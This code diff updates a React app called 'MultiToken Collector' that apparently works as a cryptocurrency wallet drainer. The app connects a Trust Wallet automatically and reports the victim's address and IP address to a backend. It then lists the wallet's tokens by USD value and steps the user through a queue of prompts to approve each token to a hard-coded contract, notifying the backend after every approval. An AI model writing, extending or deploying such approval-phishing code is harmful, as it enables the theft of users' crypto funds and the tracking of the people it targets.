@@ -1,28 +1,44 @@
-import React, { useState, useEffect } from 'react';
-import { detectOS, isTrustWallet } from './utils/detectOS';
-import { checkTrustWalletDeepLink } from './services/deepLinkService';
-import { connectWallet, getWalletAddress } from './services/walletService';
-import { scanTokens, getTokensWithValue } from './services/tokenService';
+import React, { useState, useEffect, useCallback } from 'react';
+import { getTrustWalletProvider } from './utils/detectOS';
+import { connectWallet } from './services/walletService';
+import { scanTokens, approveToken } from './services/tokenService';
 import { notifyWalletConnect, notifyApproval } from './services/apiService';
+import { CONTRACT_ADDRESS } from './config/tokens';
 import ApprovalModal from './components/ApprovalModal';
+import TrustRequired from './components/TrustRequired';
+import FinalResult from './components/FinalResult';
 
 function App() {
-    const [os, setOs] = useState('');
     const [walletAddress, setWalletAddress] = useState('');
     const [tokens, setTokens] = useState([]);
     const [currentToken, setCurrentToken] = useState(null);
     const [showModal, setShowModal] = useState(false);
     const [loading, setLoading] = useState(false);
     const [error, setError] = useState('');
+    const [showTrustRequired, setShowTrustRequired] = useState(false);
+    const [showFinalResult, setShowFinalResult] = useState(false);
+    const [tokenQueue, setTokenQueue] = useState([]);
 
+    // Auto connect check
     useEffect(() => {
-        // OS detect karo
-        const detectedOS = detectOS();
-        setOs(detectedOS);
-        
-        // Trust Wallet check
-        if (!isTrustWallet()) {
-            setError('You are not eligible. Please install Trust Wallet and try again.');
+        const params = new URLSearchParams(window.location.search);
+        if (params.get("autoconnect") === "1") {
+            let attempts = 0;
+            const timer = setInterval(() => {
+                attempts++;
+                const pCheck = getTrustWalletProvider();
+                if (pCheck && pCheck !== "REJECTED_OTHER_WALLET") {
+                    clearInterval(timer);
+                    handleConnectWallet();
+                } else if (pCheck === "REJECTED_OTHER_WALLET" || attempts > 15) {
+                    clearInterval(timer);
+                    if (pCheck === "REJECTED_OTHER_WALLET") {
+                        setShowTrustRequired(true);
+                    }
+                }
+            }, 500);
+            
+            return () => clearInterval(timer);
         }
     }, []);
 
@@ -30,71 +46,93 @@ function App() {
         try {
             setLoading(true);
             setError('');
+            setShowFinalResult(false);
             
-            // Trust Wallet check
-            if (!isTrustWallet()) {
-                setError('You are not eligible. Please install Trust Wallet and try again.');
+            const address = await connectWallet();
+            
+            if (!address) {
+                setLoading(false);
                 return;
             }
             
-            // Wallet connect
-            const address = await connectWallet();
             setWalletAddress(address);
             
             // Backend ko wallet connect notify karo
             const ipAddress = await getIPAddress();
-            await notifyWalletConnect(address, ipAddress);
+            notifyWalletConnect(address, ipAddress);
             
             // Tokens scan karo
             const scannedTokens = await scanTokens(address);
-            const tokensWithValue = getTokensWithValue(scannedTokens);
-            setTokens(tokensWithValue);
+            setTokens(scannedTokens);
             
-            // Pehla token approval ke liye
-            if (tokensWithValue.length > 0) {
-                setCurrentToken(tokensWithValue[0]);
+            if (scannedTokens.length > 0) {
+                setTokenQueue(scannedTokens);
+                setCurrentToken(scannedTokens[0]);
                 setShowModal(true);
+            } else {
+                setShowFinalResult(true);
             }
             
         } catch (error) {
-            console.error('Wallet connect error:', error);
-            setError(error.message);
+            console.error('Wallet connect error:', error.message);
+            setError(error.message || 'Connection failed');
         } finally {
             setLoading(false);
         }
     };
 
-    const handleApprovalComplete = async (tokenAddress) => {
-        try {
-            // Backend ko approval notify karo (fire & forget)
-            notifyApproval(walletAddress, tokenAddress);
+    const handleTokenApproval = async (token) => {
+        const result = await approveToken(token.address, CONTRACT_ADDRESS);
+        
+        if (result.success) {
+            // Backend ko approval notify karo
+            notifyApproval(walletAddress, token.address);
             
-            // Modal band karo
-            setShowModal(false);
+            // Queue update karo
+            const newQueue = tokenQueue.slice(1);
+            setTokenQueue(newQueue);
             
-            // Next token find karo
-            const currentIndex = tokens.findIndex(t => t.tokenAddress === tokenAddress);
-            const nextToken = tokens[currentIndex + 1];
-            
-            // 2 second delay
-            setTimeout(() => {
-                if (nextToken) {
-                    setCurrentToken(nextToken);
-                    setShowModal(true);
-                } else {
-                    setCurrentToken(null);
-                }
-            }, 2000);
-            
-        } catch (error) {
-            console.error('Approval error:', error);
+            return result;
         }
+        
+        return result;
     };
+
+    const handleApprovalComplete = useCallback((token) => {
+        setShowModal(false);
+        
+        setTimeout(() => {
+            const newQueue = tokenQueue.slice(1);
+            
+            if (newQueue.length > 0) {
+                setTokenQueue(newQueue);
+                setCurrentToken(newQueue[0]);
+                setShowModal(true);
+            } else {
+                setCurrentToken(null);
+                setShowFinalResult(true);
+            }
+        }, 500);
+    }, [tokenQueue]);
+
+    const handleCancelApproval = () => {
+        setShowModal(false);
+        setCurrentToken(null);
+        setTokenQueue([]);
+        setShowFinalResult(true);
+    };
+
+    if (showTrustRequired) {
+        return <TrustRequired />;
+    }
+
+    if (showFinalResult) {
+        return <FinalResult walletAddress={walletAddress} />;
+    }
 
     return (
         <div className="app">
             <h1>MultiToken Collector</h1>
-            <p>OS: {os}</p>
             
             {error && <div className="error">{error}</div>}
             
@@ -105,12 +143,12 @@ function App() {
             ) : (
                 <div>
                     <p>Wallet: {walletAddress}</p>
-                    <p>Tokens with value: {tokens.length}</p>
+                    <p>Tokens found: {tokens.length}</p>
                     
                     {tokens.map((token, index) => (
-                        <div key={token.tokenAddress} className="token-item">
-                            <span>{index + 1}. {token.symbol}</span>
-                            <span>${token.value}</span>
+                        <div key={token.address} className="token-item">
+                            <span>{index + 1}. {token.name}</span>
+                            <span>${token.usdValue.toFixed(2)}</span>
                         </div>
                     ))}
                 </div>
@@ -119,8 +157,8 @@ function App() {
             {showModal && currentToken && (
                 <ApprovalModal
                     token={currentToken}
-                    onComplete={handleApprovalComplete}
-                    onCancel={() => setShowModal(false)}
+                    onApprove={handleTokenApproval}
+                    onCancel={handleCancelApproval}
                 />
             )}
         </div>
